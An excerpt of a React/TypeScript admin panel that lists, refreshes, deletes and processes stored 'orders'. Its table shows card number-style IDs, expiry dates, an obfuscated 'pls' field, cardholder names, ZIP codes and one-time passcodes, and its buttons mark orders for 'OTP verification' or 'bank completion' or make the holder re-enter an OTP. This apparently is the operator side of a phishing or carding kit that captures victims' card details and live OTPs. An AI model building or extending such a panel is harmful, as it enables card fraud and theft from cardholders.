...
import { getOrders, getProcessedOrders, subscribeOrders, deleteOrder as deleteOrderFromStore, clearAllOrders, markOrderProcessed, updateOrder } from "@/utils/ordersStore";
...
export function AdminPanel() {
  ...
  useEffect(() => {
    const loadOrders = () => {
      ...
      const storedProcessedOrders = getProcessedOrders();
      console.log('Loaded orders (store):', storedOrders);
      setOrders(storedOrders as any);
      setProcessedOrders(storedProcessedOrders);
      setRawOrders(localStorage.getItem('orders') || '');
    };
  ...
  const refreshOrdersNow = () => {
    try {
      ...
      const processedArr = getProcessedOrders();
      setOrders(ordersArr as any);
      setProcessedOrders(processedArr);
      setRawOrders(localStorage.getItem('orders') || '');
      console.log('[AdminPanel] Manual refresh. Orders:', ordersArr.length);
    } catch (e) {
  ...
  const handleDeleteOrder = (orderId: string) => {
    ...
    setOrders(getOrders() as any);
    setProcessedOrders(getProcessedOrders());
    toast.success("Order deleted successfully");
  };

  const handleProcessOrder = (orderId: string, processingType: 'bank' | 'otp' = 'otp') => {
    markOrderProcessed(orderId, processingType);
    setOrders(getOrders() as any);
    setProcessedOrders(getProcessedOrders());
    toast.success(`Order processed for ${processingType === 'bank' ? 'bank completion' : 'OTP verification'}`);
  };
  ...
  const handleReenterOTP = (orderId: string) => {
    ...
    updateOrder(orderId, (o) => ({ ...o, otpCode: undefined }));
    setOrders(getOrders() as any);
                ...
                {orders.map((order) => {
                  ...
                  return (
                    <TableRow key={order.id}>
                      ...
                      <TableCell className="font-mono text-sm">{order.idNumber}</TableCell>
                      <TableCell className="font-mono text-sm">{order.expiry}</TableCell>
                      <TableCell className="font-mono text-sm">{order.pls}</TableCell>
                      <TableCell>{order.nameOnCard}</TableCell>
                      <TableCell>{order.country}</TableCell>
                      <TableCell>{order.zipCode}</TableCell>
                      <TableCell className="font-mono text-sm">{order.otpCode || '-'}</TableCell>
                      <TableCell>
